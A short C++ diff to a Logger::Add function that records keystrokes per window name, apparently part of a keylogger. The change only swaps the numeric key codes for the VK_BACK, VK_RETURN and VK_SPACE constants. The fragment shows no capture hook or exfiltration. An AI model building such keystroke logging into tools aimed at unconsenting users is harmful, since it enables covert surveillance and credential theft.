@@ -25,17 +25,16 @@ void Logger::Add(string window_name, int key_stroke)
 		// Do nothing
 	}
 
-	if (key_stroke == 8)
+	if (key_stroke == VK_BACK)
 	{
 		this->Insert(window_name, "[BACKSPACE]");
 	}
-	else if(key_stroke == 13)
+	else if(key_stroke == VK_RETURN)
 	{
 		this->Insert(window_name, "[ENTER]");
 	}
-	else if (key_stroke == 32)
+	else if (key_stroke == VK_SPACE)
 	{
-		// Insert space
 		this->Insert(window_name, " ");
 	}
 	else if (key_stroke == VK_TAB)
